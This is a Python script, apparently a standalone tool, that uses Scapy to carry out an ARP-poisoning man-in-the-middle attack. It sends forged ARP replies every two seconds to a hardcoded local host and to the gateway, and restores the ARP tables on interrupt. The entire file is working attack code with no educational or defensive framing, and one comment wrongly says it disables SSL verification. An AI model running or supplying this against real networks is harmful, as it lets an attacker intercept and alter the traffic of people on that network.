from scapy.all import ARP, Ether, send, conf
import time
from router_ip_mac import get_router_ip, get_mac

# Disable Scapy's SSL verification
conf.verb = 0  # Disable verbose output

def poison(target_ip, target_mac, spoof_ip):
    """Send spoofed ARP responses to poison the target."""
    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    ether = Ether(dst=target_mac)
    packet = ether / arp_response
    send(packet, verbose=False)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """Send correct ARP responses to restore ARP tables."""
    print("Restoring ARP tables. . .")
    # Send packets to the target and gateway to correct the ARP tables
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
    print("ARP tables restored.")

def ARP_poison():
    """Main ARP poisoning loop."""
    try:
        target_ip = "192.168.2.100"
        gateway_ip = get_router_ip()
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            raise ValueError("Could not find MAC address for target or gateway")

        print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
        while True:
            # Poison the target
            poison(target_ip, target_mac, gateway_ip)
            # Poison the gateway
            poison(gateway_ip, gateway_mac, target_ip)
            time.sleep(2)  # Send every 2 seconds
    except KeyboardInterrupt:
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)

    except ValueError as e:
        print(e)

ARP_poison()
